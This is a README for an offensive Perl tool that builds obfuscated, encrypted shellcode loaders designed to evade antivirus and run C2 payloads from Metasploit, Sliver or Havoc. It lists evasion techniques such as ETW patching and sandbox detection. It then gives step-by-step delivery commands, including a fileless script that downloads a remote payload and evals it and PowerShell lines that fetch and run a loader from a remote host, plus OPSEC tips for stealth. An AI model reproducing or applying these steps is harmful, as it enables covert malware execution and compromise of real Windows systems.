### Invoke-Perl-ShellCodeLoader.pl
--------------------------------------
'Invoke-Perl-ShellCodeLoader' is a shellcode loader script generator that aims to bypass AV solutions such as Windows Defender.
It generates an obfuscated and encrypted shellcode loader (Perl script) that implements several antivirus bypass and defense evasion techniques.

#### FEATURES
  - Shellcode injection into the memory of the current process (Perl)
  - Shellcode encryption (XOR) and compression (Zlib)
  - Script obfuscation (randomized function and variable names + nested payloads with reflective loading)
  - ETW bypass in user-mode (patching 'NtTraceEvent')
  - Dynamic API resolution for the shellcode injection (via GetProcAddress + hash-based API resolution)
  - Memory protection hardening (Applies section-specific memory permissions i.e. first RW, then switch to RX after copy)
  - Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
  - Compatible with shellcodes of multiple C2 frameworks such as Metasploit, Sliver and Havoc

#### USAGE
- STEP 1. Generate an obfuscated shellcode loader (Perl script) using a raw shellcode from your preferred C2 framework as input.
```
Example:
C:\path\perl> perl.exe .\Invoke-Perl-ShellCodeLoader.pl ".\raw-C2-shellcode.bin" ".\obfuscated_shellcodeloader.pl"
```

- STEP 2. Multiple options exist to download & execute the obfuscated shellcode loader (Perl script) on a target Windows computer

  - Option A: Utilize a portable Perl interpreter (https://strawberryperl.com/) + Fileless delivery of the obfuscated shellcode loader (Perl script) 
```
1 - Download the Strawberry Perl zip archive file from "strawberryperl.com" which provides a portable Perl interpreter with a good reputation.
    Note: the portable Perl zip archive is quite big and it can be lightened > for instance we can delete the 'c' folder that is 812 MB.
    Example:
    --------
    PS C:\temp> wget -uri https://github.com/StrawberryPerl/Perl-Dist-Strawberry/releases/download/SP_54021_64bit_UCRT/strawberry-perl-5.40.2.1-64bit-portable.zip -OutFile C:\temp\perl.zip
    PS C:\temp> tar -xf .\perl.zip

2 - Download from a remote web server and execute directly in memory the obfuscated shellcode loader script on the target Windows machine using Perl.
    This fileless delivery technique enhances stealth and helps evade static antivirus detection.
    Example:
    --------
    C:\temp\perl-portable\perl\bin> type .\Perl-fileless-delivery.pl
    #Perl
    use LWP::Simple;
    my $url = 'http://example.com/obfuscated_shellcodeloader.pl';
    my $script = get($url);
    eval $script;

    C:\temp\perl-portable\perl\bin> perl.exe .\Perl-fileless-delivery.pl
```
  - Option B: Utilize a portable Perl interpreter (https://strawberryperl.com/) + Download the obfuscated shellcode loader (Perl script) locally before execution.
```
1 - Download the Strawberry Perl zip archive file from "strawberryperl.com" which provides a portable Perl interpreter with a good reputation.
    Note: the portable Perl zip archive is quite big and it can be lightened > for instance we can delete the 'c' folder that is 812 MB.
    Example:
    --------
    PS C:\temp> wget -uri https://github.com/StrawberryPerl/Perl-Dist-Strawberry/releases/download/SP_54021_64bit_UCRT/strawberry-perl-5.40.2.1-64bit-portable.zip -OutFile C:\temp\perl.zip
    PS C:\temp> tar -xf .\perl.zip

2 - Download and store the obfuscated shellcode loader script locally on disk before executing it with Perl.
    While obfuscation and encryption help evade static analysis by most antivirus solutions, this approach may offer reduced stealth compared to in-memory execution.
    Example:
    --------
    C:\temp\perl-portable\perl\bin> powershell -c "wget -uri http://X.X.X.X/obfuscated_shellcodeloader.pl -OutFile C:\temp\perl-portable\perl\bin\obfuscated_shellcodeloader.pl"
    C:\temp\perl-portable\perl\bin> perl.exe .\obfuscated_shellcodeloader.pl
```
  - Option C (not recommended): Use Perl2Exe or "Strawberry Perl + PAR::Packer" to bundle the obfuscated shellcode loader Perl script into a single executable (e.g. script.exe) and then download and execute it on a target Windows computer
```
1 - Bundle the obfuscated shellcode loader Perl script into a single executable (e.g. script.exe)
    Example with "Strawberry Perl + PAR::Packer":
    ---------------------------------------------
    C:\path\perl\bin> set PAR_VERBATIM=1
    C:\path\perl\bin> pp -o script.exe -M MIME::Base64 -M Compress::Zlib obfuscated_shellcodeloader.pl

2 - Download and execute the obfuscated shellcode loader "script.exe" on a target Windows computer
    Important note => Many antivirus products (including Windows Defender) detect as malicious perl script embeded in "exe" file.
    Example:
    --------
    C:\temp> powershell -c "wget -uri http://X.X.X.X/script.exe -OutFile C:\temp\script.exe"
    C:\temp> script.exe
```

#### OPSEC advices
- Remove all existing comments in the script (loader template) before generating your obfuscated shellcode loader.
- When possible use fileless delivery technique to enhance stealth and evade static antivirus detection.
  
#### LICENSE
  - GNU General Public License v3.0
